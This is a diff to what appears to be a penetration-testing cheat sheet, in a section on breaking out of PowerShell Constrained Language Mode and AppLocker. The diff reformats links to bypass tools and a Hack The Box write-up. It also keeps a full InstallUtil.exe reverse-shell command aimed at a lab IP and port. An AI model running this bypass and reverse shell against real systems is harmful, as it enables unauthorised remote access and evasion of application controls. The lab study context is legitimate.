@@ -1792,10 +1792,9 @@ maybe you are in a directory where there is something strange
 - Verify that you are in a contained enviorment with
   - `$executioncontext.sessionstate.languagemode`
   - `Get-AppLockerPolicy -Effective -XML`
-  - see https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
-- https://github.com/padovah4ck/PSByPassCLM
-- https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
-- reverse shell: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.4 /rport=443 \users\amanda\appdata\local\temp\a.exe`
+- [PSByPassCLM](https://github.com/padovah4ck/PSByPassCLM)
+- [HTB: Sizzle | 0xdf hacks stuff](https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html#clm--applocker-break-out)
+- Reverse shell: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U /revshell=true /rhost=10.10.14.4 /rport=443 \users\amanda\appdata\local\temp\a.exe`
 - Msbuild: https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/
            https://0xdf.gitlab.io/2019/06/01/htb-sizzle.html
 
